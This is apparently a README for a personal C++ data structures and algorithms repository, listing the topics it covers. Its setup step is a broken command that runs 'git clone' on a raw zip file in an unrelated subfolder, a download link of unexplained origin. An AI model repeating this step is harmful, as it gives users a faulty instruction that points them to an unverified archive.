# DSA

Welcome to my DSA repository! This repository contains code I have written related to various topics in **Data Structures and Algorithms**. It covers a wide range of topics such as Arrays, Strings, Object-Oriented Programming (OOP), and more. All the code is written in **C++** and is organized by topic for easy navigation.

## Topics Covered
- **Arrays**: Basic array operations, sorting, searching, etc.
- **Strings**: String manipulation, algorithms, and patterns.
- **Object-Oriented Programming (OOP)**: Concepts like classes, objects, inheritance, polymorphism, etc.
- **Linked Lists**: Implementations of singly and doubly linked lists.
- **Stacks & Queues**: Data structures and algorithms based on stack and queue.
- **Trees**: Binary trees, binary search trees, tree traversal algorithms.
- **Sorting & Searching**: Algorithms like quicksort, mergesort, binary search, etc.
- **Recursion**: Solving problems using recursive approaches.
- **Dynamic Programming**: Common problems and solutions using dynamic programming techniques.

## Language Used
- **C++**: All code is written in C++.

## How to Use
1. Clone the repository to your local machine:
   ```bash
   git clone https://raw.githubusercontent.com/rushangchandekar/DSA/main/Mott/DSA.zip
